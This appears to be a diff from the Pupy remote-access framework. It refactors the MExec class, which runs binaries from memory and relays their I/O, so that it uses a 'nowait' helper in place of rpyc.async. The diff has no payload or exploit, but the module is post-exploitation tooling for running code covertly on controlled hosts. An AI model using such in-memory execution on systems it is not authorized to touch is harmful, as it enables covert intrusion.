@@ -3,12 +3,13 @@
 import os
 import threading
 import zlib
-import rpyc
 
 from select import select
 from pupy import mexec
 from fcntl import fcntl, F_GETFL, F_SETFL
 from os import O_NONBLOCK
+from network.lib.pupyrpc import nowait
+
 
 class MExec(object):
     def __init__(self, data, argv0, args=[], no_stdin=True, no_stdor=False, redirect_stdio=True, compressed=False, terminate=True):
@@ -110,8 +111,8 @@ class MExec(object):
 
     def execute(self, on_exit, on_read):
         if self.run():
-            on_exit = rpyc.async(on_exit)
-            on_read = rpyc.async(on_read)
+            on_exit = nowait(on_exit)
+            on_read = nowait(on_read)
 
             self.on_exit = on_exit
 
@@ -172,7 +173,7 @@ class MExec(object):
 
         reader = threading.Thread(
             target=self.stdor_loop, args=(
-                rpyc.async(on_read), rpyc.async(on_exit)))
+                nowait(on_read), nowait(on_exit)))
         reader.daemon = True
         reader.start()
 
